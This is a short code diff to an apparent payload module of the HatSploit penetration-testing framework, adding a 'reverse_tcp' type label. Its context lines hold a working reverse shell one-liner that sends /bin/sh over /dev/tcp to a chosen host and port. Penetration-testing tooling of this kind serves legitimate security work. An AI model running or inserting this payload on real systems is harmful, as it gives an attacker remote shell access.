@@ -56,5 +56,6 @@ class HatSploitPayload(HatSploitPayload):
 
         self.data['payload'] = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
         self.data['execute'] = self.data['payload']
+        self.data['type'] = 'reverse_tcp'
 
         return self.data
